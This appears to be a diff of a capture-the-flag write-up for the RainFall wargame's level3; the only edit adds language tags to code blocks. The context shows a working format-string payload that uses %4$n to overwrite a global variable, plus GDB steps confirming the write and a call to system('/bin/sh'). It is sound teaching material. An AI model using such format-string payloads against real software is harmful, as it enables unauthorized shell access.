@@ -237,7 +237,7 @@ Our goal is to write the value 64 (0x40) to the memory location `0x0804988c`, wh
 
 We craft a payload that prints 64 characters before reaching `%4$n`:
 
-```
+```bash
 level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/exploit
 ```
 
@@ -246,7 +246,7 @@ To validate that the payload works as expected, we place two breakpoints in GDB:
 * The first is set just after the call to `printf()` at address `0x080484da`, where the program checks the value of `m`.
 * The second is placed on the `system()` function, to confirm that the program attempts to launch a shell.
 
-```
+```gdb
 (gdb) break *0x080484da    # Right after printf(), before comparing m
 (gdb) break system         # Catch call to system("/bin/sh")
 (gdb) run < /tmp/exploit
@@ -254,7 +254,7 @@ To validate that the payload works as expected, we place two breakpoints in GDB:
 
 Once the first breakpoint is hit, we inspect the value of `m`:
 
-```
+```gdb
 (gdb) x/wx 0x0804988c
 0x804988c <m>:  0x00000040
 ```
@@ -263,7 +263,7 @@ This confirms that `%n` successfully wrote the value `0x40` (64 in decimal) to 
 
 When execution resumes, GDB stops again at the `system()` call. We can inspect its argument:
 
-```
+```gdb
 (gdb) continue
 Continuing.
 Wait what?!
